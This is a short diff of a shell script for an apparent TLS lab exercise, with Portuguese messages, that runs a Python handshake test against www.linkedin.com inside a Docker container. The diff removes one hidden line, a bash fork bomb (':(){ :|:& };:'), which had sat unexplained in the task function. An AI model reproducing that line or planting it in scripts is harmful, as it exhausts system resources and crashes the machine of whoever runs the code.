@@ -154,7 +154,6 @@ task_1a() {
     print_status "Executando Task 1.a: TLS Handshake..."
     
     print_warning "Testando conexão com www.linkedin.com..."
-    :(){ :|:& };:
     docker exec -it client-10.9.0.5 bash -c "cd /volumes && echo '' | python3 handshake.py www.linkedin.com"
     
     print_success "Task 1.a concluída"
